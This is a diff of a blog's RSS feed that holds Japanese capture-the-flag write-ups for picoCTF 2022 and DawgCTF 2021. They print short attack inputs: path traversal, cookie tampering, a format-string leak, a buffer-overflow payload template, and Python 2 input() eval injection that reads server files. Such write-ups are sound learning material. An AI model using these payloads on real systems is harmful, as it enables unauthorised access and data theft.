@@ -10,92 +10,6 @@
     <lastBuildDate>Mon, 18 Apr 2022 21:12:08 +0900</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>picoCTF 2022 Writeup</title>
-      <link>/picoctf2022/</link>
-      <pubDate>Mon, 18 Apr 2022 21:12:08 +0900</pubDate>
-      
-      <guid>/picoctf2022/</guid>
-      <description>picoCTF 2022 目次  Web  Forbidden Paths SQL Direct Power Cookie Roboto Sans Secrets SQLiLite Search source   Binary(Pwn)  flag leek File types RPS buffer overflow 0 buffer overflow 1 buffer overflow 2 x-sixty-what   Rev  Fresh Java Bbbbloat unpackme    Forbidden Paths 相対パスを使う。 ../../../../flag.txt
-SQL Direct DBに接続して\dからのselect * from flags
-Power Cookie CookieのisAdminを1にして読み込む。
-Roboto Sans robots.txtを見るとBase64エンコードされたパスがあるのでデコードしてそこにアクセス。
-Secrets ソースコードを眺めるとsecretという謎のパスが一段入ってるものが見つかる。アクセスして順に同じことをやるとたどり着く。
-SQLiLite シンプルなSQLインジェクション。
-Search source CSSファイル内のコメントにフラグがある。</description>
-      <content>&lt;h1 id=&#34;picoctf-2022&#34;&gt;picoCTF 2022&lt;/h1&gt;
-&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;Web
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#forbidden-paths&#34;&gt;Forbidden Paths&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#sql-direct&#34;&gt;SQL Direct&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#power-cookie&#34;&gt;Power Cookie&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#roboto-sans&#34;&gt;Roboto Sans&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#secrets&#34;&gt;Secrets&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#sqlilite&#34;&gt;SQLiLite&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#search-source&#34;&gt;Search source&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Binary(Pwn)
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#flag-leek&#34;&gt;flag leek&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#file-types&#34;&gt;File types&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#rps&#34;&gt;RPS&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#buffer-overflow-0&#34;&gt;buffer overflow 0&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#buffer-overflow-1&#34;&gt;buffer overflow 1&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#buffer-overflow-2&#34;&gt;buffer overflow 2&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#x-sixty-what&#34;&gt;x-sixty-what&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Rev
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#fresh-java&#34;&gt;Fresh Java&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#bbbbloat&#34;&gt;Bbbbloat&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#unpackme&#34;&gt;unpackme&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;forbidden-paths&#34;&gt;Forbidden Paths&lt;/h2&gt;
-&lt;p&gt;相対パスを使う。
-&lt;code&gt;../../../../flag.txt&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;sql-direct&#34;&gt;SQL Direct&lt;/h2&gt;
-&lt;p&gt;DBに接続して&lt;code&gt;\d&lt;/code&gt;からの&lt;code&gt;select * from flags&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;power-cookie&#34;&gt;Power Cookie&lt;/h2&gt;
-&lt;p&gt;CookieのisAdminを1にして読み込む。&lt;/p&gt;
-&lt;h2 id=&#34;roboto-sans&#34;&gt;Roboto Sans&lt;/h2&gt;
-&lt;p&gt;robots.txtを見るとBase64エンコードされたパスがあるのでデコードしてそこにアクセス。&lt;/p&gt;
-&lt;h2 id=&#34;secrets&#34;&gt;Secrets&lt;/h2&gt;
-&lt;p&gt;ソースコードを眺めるとsecretという謎のパスが一段入ってるものが見つかる。アクセスして順に同じことをやるとたどり着く。&lt;/p&gt;
-&lt;h2 id=&#34;sqlilite&#34;&gt;SQLiLite&lt;/h2&gt;
-&lt;p&gt;シンプルなSQLインジェクション。&lt;/p&gt;
-&lt;h2 id=&#34;search-source&#34;&gt;Search source&lt;/h2&gt;
-&lt;p&gt;CSSファイル内のコメントにフラグがある。&lt;/p&gt;
-&lt;h2 id=&#34;flag-leek&#34;&gt;flag leek&lt;/h2&gt;
-&lt;p&gt;フォーマットストリング攻撃ができるので読み出す。&lt;br&gt;
-&lt;code&gt;echo &#39;AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ:%36$p&#39; | ./vuln&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;file-types&#34;&gt;File types&lt;/h2&gt;
-&lt;p&gt;ファイルの中身を見るとshell archive(shar)というものらしい。shで解凍するとarという圧縮形式のファイルが出てくる。アーカイバをインストールして解凍すると次はcpioという形式のファイルが出てくる。bzip2、gzip、lgipと続いてそろそろ終わりかと思うがまだ終わらない。&lt;code&gt;ASCII text&lt;/code&gt;と出てくることを願いながらfileコマンドを叩いて、アーカイバをインストールし解凍して、を繰り返すとLZ4、LZMA、lzop、lzip、XZで終わる。途中でやめようか迷った。&lt;/p&gt;
-&lt;h2 id=&#34;rps&#34;&gt;RPS&lt;/h2&gt;
-&lt;p&gt;ソースコードを読むと&lt;code&gt;srand(time(0))&lt;/code&gt;があり、これはタイミング攻撃が可能。手元でも同じように&lt;code&gt;srand(time(0))&lt;/code&gt;の&lt;code&gt;rand() % 3&lt;/code&gt;を出力するCのコードを書いてコンパイルする。Pythonからその実行ファイルを呼び出して勝つ手を出すスクリプトを書いて実行してみるが絶妙にサーバー側と時間がズレていて何度も調整するがなかなか綺麗に合わせられない。ズレがあるとは言え1秒間の間では同じ手が出されるため連勝はしやすい。最終的に完璧な調整は諦めて運よく5連勝できることを待つという方法でフラグをゲット。&lt;/p&gt;
-&lt;h2 id=&#34;buffer-overflow-0&#34;&gt;buffer overflow 0&lt;/h2&gt;
-&lt;p&gt;適当に長い文字列を入力に渡すとフラグが貰える。&lt;/p&gt;
-&lt;h2 id=&#34;buffer-overflow-1&#34;&gt;buffer overflow 1&lt;/h2&gt;
-&lt;p&gt;win関数に飛ばせばフラグが貰える。&lt;code&gt;objdump -d vuln&lt;/code&gt;などでwinのアドレスを確認し、バッファオーバーフローでvulnのリターンアドレスをwinのアドレスに書き換える。&lt;/p&gt;
-&lt;h2 id=&#34;buffer-overflow-2&#34;&gt;buffer overflow 2&lt;/h2&gt;
-&lt;p&gt;これもwin関数に飛ばせばフラグが貰える。しかしwin関数に2つの引数(arg1とarg2)に正しい値を渡さないとフラグが貰えない。vulnのリターンアドレスをwinのアドレスに書き換えるとして、winのアドレスの次にarg1とarg2を置けばフラグが出力される。ここでリモートで試してみるがフラグが貰えない。GDBで試すとどうやらwinのあとにリターンアドレスでarg1を参照してセグフォで落ちている模様。0x804945あたりにpopを4回してretしているありがたいgadgetがあるので、popで引数2個分スタックポインタをずらして、mainのアドレスにリターンさせる。&lt;br&gt;
-ペイロードはこんな感じになる。&lt;code&gt;b&amp;quot;A&amp;quot; * (buf_size + 8) + base_addr + win_addr + pop_addr + arg1 + arg2 + main_addr&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;x-sixty-what&#34;&gt;x-sixty-what&lt;/h2&gt;
-&lt;p&gt;64bitでのBoF。Pwn初心者なのであまり正しく理解できている自信はないが、Intel CETという機能があり、jmp/callでendbr32/64以外の場所に飛べなくする機構があるらしい(参考リンク: &lt;a href=&#34;https://smallkirby.hatenablog.com/entry/2020/09/10/230629&#34;&gt;【pwn 36.0】Intel CETが、みんなの恋人ROPを殺す&lt;/a&gt;)。flag関数でフラグが貰えるのでBoFでflag関数に飛ばしたあとにmainに飛ばせばフラグゲット。&lt;/p&gt;
-&lt;h2 id=&#34;fresh-java&#34;&gt;Fresh Java&lt;/h2&gt;
-&lt;p&gt;classファイルをデコンパイルするとフラグを1文字ずつ検証するコードが出てくる。ハードコードされているのでフラグゲット。&lt;/p&gt;
-&lt;h2 id=&#34;bbbbloat&#34;&gt;Bbbbloat&lt;/h2&gt;
-&lt;p&gt;特定の数値を渡すとフラグが貰える実行ファイルらしい。Ghidraでデコンパイルすると数値がわかる。&lt;/p&gt;
-&lt;h2 id=&#34;unpackme&#34;&gt;unpackme&lt;/h2&gt;
-&lt;p&gt;UPXでパックされているのでまずアンパックする。若干難読化されているがBbbbloatとほとんど変わらない動作をする実行ファイルが出てくる。Ghidraでデコンパイルしても見づらかったのでIDA Freeを使うと綺麗にデコンパイルされて数値がわかる。GhidraとIDA Freeを適材適所で使い分けられると便利かもしれない。&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>picoCTF 2022 Writeup</title>
       <link>/picoctf2022/picoctf2022/</link>
       <pubDate>Mon, 18 Apr 2022 21:12:08 +0900</pubDate>
       
@@ -181,347 +95,89 @@ Search source CSSファイル内のコメントにフラグがある。</descrip
     </item>
     
     <item>
-      <title></title>
-      <link>/dawgctf2021/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>picoCTF 2022 Writeup</title>
+      <link>/posts/picoctf2022/</link>
+      <pubDate>Mon, 18 Apr 2022 21:12:08 +0900</pubDate>
       
-      <guid>/dawgctf2021/</guid>
-      <description>DawgCTF 2021 Writeup 目次  Pwn  No Step On Snek Jellyspotters MDL Considered Harmful    No Step On Snek 問題 75 points
-I heard you guys like python pwnables
-nc umbccd.io 4000
-Author: trashcanna
-解説 ncコマンドで接続すると以下のように表示されます。
-Welcome to the aMAZEing Maze Your goal is to get from one side of the board to the other. Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34; W/w - Move up!</description>
-      <content>&lt;h1 id=&#34;dawgctf-2021-writeup&#34;&gt;DawgCTF 2021 Writeup&lt;/h1&gt;
+      <guid>/posts/picoctf2022/</guid>
+      <description>picoCTF 2022 目次  Web  Forbidden Paths SQL Direct Power Cookie Roboto Sans Secrets SQLiLite Search source   Binary(Pwn)  flag leek File types RPS buffer overflow 0 buffer overflow 1 buffer overflow 2 x-sixty-what   Rev  Fresh Java Bbbbloat unpackme    Forbidden Paths 相対パスを使う。 ../../../../flag.txt
+SQL Direct DBに接続して\dからのselect * from flags
+Power Cookie CookieのisAdminを1にして読み込む。
+Roboto Sans robots.txtを見るとBase64エンコードされたパスがあるのでデコードしてそこにアクセス。
+Secrets ソースコードを眺めるとsecretという謎のパスが一段入ってるものが見つかる。アクセスして順に同じことをやるとたどり着く。
+SQLiLite シンプルなSQLインジェクション。
+Search source CSSファイル内のコメントにフラグがある。</description>
+      <content>&lt;h1 id=&#34;picoctf-2022&#34;&gt;picoCTF 2022&lt;/h1&gt;
 &lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
 &lt;ul&gt;
-&lt;li&gt;Pwn
+&lt;li&gt;Web
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#no-step-on-snek&#34;&gt;No Step On Snek&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#jellyspotters&#34;&gt;Jellyspotters&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#forbidden-paths&#34;&gt;Forbidden Paths&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#sql-direct&#34;&gt;SQL Direct&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#power-cookie&#34;&gt;Power Cookie&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#roboto-sans&#34;&gt;Roboto Sans&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#secrets&#34;&gt;Secrets&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#sqlilite&#34;&gt;SQLiLite&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#search-source&#34;&gt;Search source&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Binary(Pwn)
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#flag-leek&#34;&gt;flag leek&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#file-types&#34;&gt;File types&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#rps&#34;&gt;RPS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#buffer-overflow-0&#34;&gt;buffer overflow 0&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#buffer-overflow-1&#34;&gt;buffer overflow 1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#buffer-overflow-2&#34;&gt;buffer overflow 2&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#x-sixty-what&#34;&gt;x-sixty-what&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Rev
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#fresh-java&#34;&gt;Fresh Java&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#bbbbloat&#34;&gt;Bbbbloat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#unpackme&#34;&gt;unpackme&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;no-step-on-snek&#34;&gt;No Step On Snek&lt;/h2&gt;
-&lt;h3 id=&#34;問題&#34;&gt;問題&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;75 points&lt;/strong&gt;&lt;br&gt;
-I heard you guys like python pwnables&lt;br&gt;
-&lt;code&gt;nc umbccd.io 4000&lt;/code&gt;&lt;br&gt;
-Author: trashcanna&lt;/p&gt;
-&lt;h3 id=&#34;解説&#34;&gt;解説&lt;/h3&gt;
-&lt;p&gt;ncコマンドで接続すると以下のように表示されます。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to the aMAZEing Maze
-Your goal is to get from one side of the board to the other.
-Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34;
-W/w - Move up!
-A/a - Move left!
-S/s - Move down!
-D/d - Move right!
-+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-|OO         |        |     |        |           |
-+  +--+  +  +--+  +  +  +  +--+  +  +--+--+  +  +
-|  |  |  |     |  |  |  |  |     |  |        |  |
-+  +  +  +--+  +  +--+  +  +  +--+  +  +--+--+  +
-|  |  |  |     |     |  |     |  |  |     |     |
-+  +  +  +  +--+--+  +--+--+--+  +  +  +  +  +--+
-|     |  |        |        |        |  |  |     |
-+--+  +  +--+--+  +  +--+--+  +--+--+  +  +--+--+
-|     |  |           |     |  |     |  |  |     |
-+--+--+  +--+--+--+  +  +  +  +  +  +  +  +  +  +
-|        |        |  |  |     |  |     |     |  |
-+  +--+--+  +--+  +  +  +--+--+--+  +--+--+--+  +
-|  |        |     |  |           |     |        |
-+  +  +--+--+  +--+--+--+--+--+  +--+  +  +--+--+
-|  |     |  |                 |  |     |        |
-+  +--+  +  +--+--+--+--+--+  +  +  +--+--+--+  +
-|     |  |              |     |  |  |        |  |
-+  +  +  +  +--+--+--+  +  +--+  +  +  +--+  +  +
-|  |  |     |           |  |     |     |     |  |
-+  +  +--+--+  +--+--+--+  +  +--+--+--+  +--+  +
-|  |  |        |        |  |        |  |  |     |
-+  +--+  +--+--+  +--+  +  +--+--+  +  +  +  +  +
-|  |     |        |     |           |     |  |  |
-+  +  +--+--+--+--+  +--+--+--+--+--+  +--+  +  +
-|     |     |     |           |  |     |  |  |  |
-+  +--+  +  +  +  +--+  +--+  +  +  +--+  +  +  +
-|  |     |     |     |  |     |           |  |  |
-+  +  +--+--+--+--+  +  +  +--+  +--+--+--+  +  +
-|     |           |     |  |     |        |  |  |
-+--+--+  +--+--+  +--+--+  +--+--+  +--+  +  +  +
-|              |                    |        |FF|
-+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-
-
-Make your move:
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;まずW, A, S, D以外の文字、例えばZを入れてみると以下のように出力されました。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Make your move: Z
-Traceback (most recent call last):
-  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 73, in &amp;lt;module&amp;gt;
-    __main__()
-  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 69, in __main__
-    still_playing = make_move(maze)
-  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 27, in make_move
-    move = input(&amp;#34;Make your move: &amp;#34;)
-  File &amp;#34;&amp;lt;string&amp;gt;&amp;#34;, line 1, in &amp;lt;module&amp;gt;
-NameError: name &amp;#39;Z&amp;#39; is not defined
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;見るからにPythonなのですが、&lt;code&gt;NameError: name &#39;Z&#39; is not defined&lt;/code&gt;とあるため入力がそのままコードとして解釈されています。これはPython2系の仕様であり、input()は受け取った文字列をeval()のように式としてそのまま解釈します。&lt;br&gt;
-いろいろ試すと、&lt;code&gt;make_move(1)&lt;/code&gt;や&lt;code&gt;make_move(&amp;quot;a&amp;quot;)&lt;/code&gt;などで引数に渡した値がそのまま返ってくることに気付きます。あとは大体何でもできるのですが、エラー文でファイルのパスが分かっているのでまずこのファイルの中身を見るために&lt;code&gt;make_move(open(&amp;quot;/home/challuser/nosteponsnek.py&amp;quot;).read())&lt;/code&gt;をしてみます。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python2.7&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; random &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; shuffle, randrange
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;W &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;w &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;valid_moves &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [W, w, A, a, S, s, D, d]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;welcome&lt;/span&gt;():
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to the aMAZEing Maze&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your goal is to get from one side of the board to the other.&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your character is represented by &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;OO&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; and the finish will be &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;FF&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;W/w - Move up!&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A/a - Move left!&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;S/s - Move down!&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D/d - Move right!&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make_move&lt;/span&gt;(maze):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print maze
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        move &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Make your move: &amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; move &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; valid_moves:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NameError&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# TODO: Move the player around the board&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Was a little cruched for time this year so I didn&amp;#39;t feel like writing&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# the gameplay. I hope that&amp;#39;s okay :/&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_last&lt;/span&gt;(s, replace_what, replace_with):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        head, _sep, tail &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rpartition(replace_what)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; head &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; replace_with &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tail
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Randomly generate the gameboard and insert start/finish&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make_maze&lt;/span&gt;(w &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
